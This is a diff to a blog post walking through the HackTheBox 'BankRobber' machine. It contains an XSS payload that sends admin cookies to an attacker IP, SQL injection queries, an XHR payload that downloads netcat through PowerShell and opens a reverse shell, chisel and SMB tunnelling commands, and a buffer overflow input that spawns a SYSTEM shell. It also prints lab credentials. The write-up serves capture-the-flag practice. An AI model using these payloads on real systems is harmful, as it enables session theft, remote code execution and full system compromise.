@@ -7,7 +7,7 @@ tags:
 - jekyll theme
 - jekyll
   date: 2021-11-27
-  tags: [write up, hackthebox, Linux]
+  tags: [write up, hackthebox, Windows]
   categories: [Practice]
   toc: true
 
@@ -117,7 +117,9 @@ Upon submitting this trade we also see an alert window stating an admin will rev
 Performing the same method as above, sending a trade with some imbedded XSS can give us the admin cookie as soon as the admin account opens the trade.
 
 ```javascript
-<script>new Image().src="http://10.10.14.31/Craz3.php?output="%2bdocument.cookie;</script>
+<script>
+  new Image().src="http://10.10.14.31/Craz3.php?output="%2bdocument.cookie;
+</script>
 ```
 
 We get the following reply back:
@@ -136,60 +138,94 @@ We get the following reply back:
 
 ---
 
-## WebApp
+## Admin WebApp
 
-SQL INJECTION
+Using the new admin credentials, logging into the site now provides a table of transactions to review along with some SQL search fields of user accounts.
 
+### SQL INJECTION
 
-DB Version
+Testing the field instantly gives an SQL error.
 
-> term=1' UNION ALL SELECT @@VERSION,2,3 -- -
+![SQL Injection](https://mitchelldstein.github.io/assets/images/BankRobber/SQL.png)
 
+Below is some enumeration through this injection.
+
+```text
+$ term=1' UNION ALL SELECT @@VERSION,2,3 -- -
     10.1.38-MariaDB
-
-> term=1' UNION ALL SELECT user(),2,3 -- -
-
+$ term=1' UNION ALL SELECT user(),2,3 -- -
     root@localhost
+```
 
 ---
 
-XSS
-Testing if XSS is possible
+## Further XSS
 
-Script: “exploit.js”
+The following XSS payload will abuse XHR functionality allowing us to upload a nc.exe program
+
+```js
 var request = new XMLHttpRequest();
-var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.31/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.31 443';
-request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
-request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+var params =
+  'cmd=dir|powershell -c "iwr -uri 10.10.14.31/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.31 443';
+request.open("POST", "http://localhost/admin/backdoorchecker.php", true);
+request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 request.send(params);
+```
 
-Make sure to setup python http server first > sudo python3 -m http.server 80
+In order for this script to do what it needs to we must first make sure we have an http server running to upload the nc.exe file.
 
-How to execute:
-on user page:
+```zsh
+sudo python3 -m http.server 80
+```
 
-<script src="http://10.10.14.31/exploit.js"></script>
+Having out NetCat session open also allows us to get a reverse shell from the uploaded XHR exploit.
 
-> C:\xampp\htdocs>type
+```zsh
+rlwrap nc -nlvp 4444
+```
 
-    $user = 'root';
-    $pass = 'Welkom1!';
+## User Shell
+
+### Windows Enumeration
+
+To enumerate the box my favorite tool is WinPEAS
+
+To get this onto the machine, load up smb server on linux machine to allow windows to grab the file through the victim PC
+
+```zsh
+sudo impacket-smbserver share .
+```
+
+Transfer over winPEASx64.exe to enumerate the system
+
+```cmd
+C:\ copy \\10.10.14.31\cthulhu\winPEASx64.exe .
+```
+
+Using this tool we found a very perculiar localhost listening port on 910.
+
+Forward port 910 to internal chisel server.
+
+On the windows machine:
+
+```cmd
+C:\ copy \\10.10.14.31\share\chisel.exe .
+.\chisel.exe client 10.10.14.31:18110 R:910:localhost:910
+```
+
+On your local Kali machine:
+
+```zsh
+./chisel server -p 18110 --reverse
+```
 
 ---
 
-AFTER SHELL
+## Buffer Overflow
 
-Load up smb server on linux machine to allow windows to grab files > sudo impacket-smbserver cthulhu .
+Under port 910 there is an executable we can exploit with a buffer overflow.
 
-Transfer over winPEASx64.exe to enumerate the system > C:\ copy \\10.10.14.31\cthulhu\winPEASx64.exe .
-found port 910 pointing to localhost
-
-Forward port 910 to internal chisel server > C:\ copy \\10.10.14.31\cthulhu\chisel.exe .
-win > .\chisel.exe client 10.10.14.31:18110 R:910:localhost:910
-lin > ./chisel server -p 18110 --reverse
-
-## Get into port service > nc localhost 910
-
+```cmd
 Internet E-Coin Transfer System
 International Bank of Sun church
 v0.1 by Gio & Cneeliz
@@ -199,34 +235,36 @@ v0.1 by Gio & Cneeliz
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
+```
+Using the example in my [Buffer Overflow Overview](https://mitchelldstein.github.io/tools/2021/11/02/buffer-overflow/), we can craft an exploit to get a shell through this program.
 
-—————————————————————————
-BUFFER OVERFLOW
-
+```
 /usr/bin/msf-pattern_create -l 100
 
-    > nc localhost 910
-        --------------------------------------------------------------
-        Internet E-Coin Transfer System
-        International Bank of Sun church
-                                               v0.1 by Gio & Cneeliz
-        --------------------------------------------------------------
-        Please enter your super secret 4 digit PIN code to login:
-        [$] 0021
-        [$] PIN is correct, access granted!
+┌──(root💀kali-linux-2021-1)-[/home/parallels]
+└─#nc localhost 910
+    --------------------------------------------------------------
+    Internet E-Coin Transfer System
+    International Bank of Sun church
+                                            v0.1 by Gio & Cneeliz
+    --------------------------------------------------------------
+    Please enter your super secret 4 digit PIN code to login:
+    [$] 0021
+    [$] PIN is correct, access granted!
 
-    Enter:
-    > Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9AbC:\users\cortin\nc64.exe 10.10.14.31 8443 -e cmd
+Enter:
+$ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9AbC:\users\cortin\nc64.exe 10.10.14.31 8443 -e cmd
+```
 
----
+```zsh
+┌──(root💀kali-linux-2021-1)-[/home/parallels]
+└─# rlwrap nc -nlvp 8443
+. . .
+Connect to [10.10.14.31] from (UNKNOWN) [10.10.10.154] 49803
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.
 
-CREDENTIALS:
-
-- ADMIN
-  U: admin
-  P: Hopelessromantic
-
-> C:\xampp\htdocs>type
-
-    $user = 'root';
-    $pass = 'Welkom1!';
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
